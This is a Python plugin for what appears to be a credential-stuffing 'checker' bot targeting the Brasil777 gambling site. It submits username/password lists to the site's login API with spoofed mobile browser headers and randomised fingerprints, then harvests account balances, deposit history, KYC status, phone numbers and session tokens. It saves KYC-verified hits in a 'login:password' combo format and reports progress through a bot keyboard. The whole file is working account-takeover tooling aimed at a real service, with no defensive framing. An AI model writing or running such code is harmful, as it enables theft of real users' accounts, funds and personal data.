from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json
import hashlib
import random
import string

class Brasil777Checker(BaseChecker):
    """Brasil777 site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://backoffice.brasil777.com/api/login"
    
    # الهيدرات الأساسية
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://brasil777.com",
        'sec-fetch-site': "same-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://brasil777.com/",
        'accept-language': "en-US,en;q=0.9,ar;q=0.8"
    }
    
    def generate_fingerprint(self):
        """توليد بصمة عشوائية"""
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
        return hashlib.md5(random_string.encode()).hexdigest()
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single Brasil777 account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. تسجيل الدخول
            payload = {
                "email": username,
                "password": password,
                "fingerprint": self.generate_fingerprint()
            }
            
            response = session.post(
                self.LOGIN_URL,
                json=payload,
                timeout=20
            )
            
            # 2. تحقق من الاستجابة
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            # التحقق من نجاح تسجيل الدخول
            if not data.get("success", False):
                return {"status": "bad", "username": username}
            
            # 3. استخراج التوكن وبيانات المستخدم
            token = data.get("token", "")
            user_data = data.get("user", {})
            
            if not token:
                return {"status": "error", "username": username}
            
            # 4. استخراج البيانات المهمة
            kyc_status = user_data.get("kyc_status", "unverified")
            is_kyc_verified = (kyc_status.lower() == "verified")
            
            deposit_count = int(user_data.get("deposit_count", 0))
            has_deposited = deposit_count > 0
            
            # استخراج الأرصدة
            total_balance = float(user_data.get("total_balance", 0))
            bonus_balance = float(user_data.get("bonus_balance", 0))
            balance = float(user_data.get("balance", 0))
            cashback = float(user_data.get("cashback", 0))
            
            # 5. رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "email": user_data.get("email", ""),
                "username": user_data.get("username", ""),
                "user_id": user_data.get("id", ""),
                "phone": user_data.get("phone", ""),
                "country": user_data.get("country", ""),
                "status": user_data.get("status", ""),
                "kyc_status": kyc_status,
                "is_kyc_verified": is_kyc_verified,
                "has_deposited": has_deposited,
                "deposit_count": deposit_count,
                "total_balance": total_balance,
                "bonus_balance": bonus_balance,
                "balance": balance,
                "cashback": cashback,
                "currency": user_data.get("currency", "USD"),
                "token": token,
                "language": user_data.get("language", "en"),
                "timezone": user_data.get("timezone", ""),
                "email_verified_at": user_data.get("email_verified_at", ""),
                "created_at": user_data.get("created_at", ""),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except json.JSONDecodeError:
            return {"status": "error", "username": username, "error": "Invalid JSON response"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط: KYC مفعل فقط
        return account_data.get("is_kyc_verified", False)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"email={account_data['email']} | " \
               f"username={account_data['username']} | " \
               f"kyc={account_data['kyc_status']} | " \
               f"deposited={account_data['has_deposited']} | " \
               f"deposit_count={account_data['deposit_count']} | " \
               f"total_balance=${account_data['total_balance']:.2f} | " \
               f"balance=${account_data['balance']:.2f} | " \
               f"bonus=${account_data['bonus_balance']:.2f} | " \
               f"country={account_data['country']} | " \
               f"phone={account_data.get('phone', '')}\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """تخصيص لوحة الإحصائيات"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"🔒 KYC Verified: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }
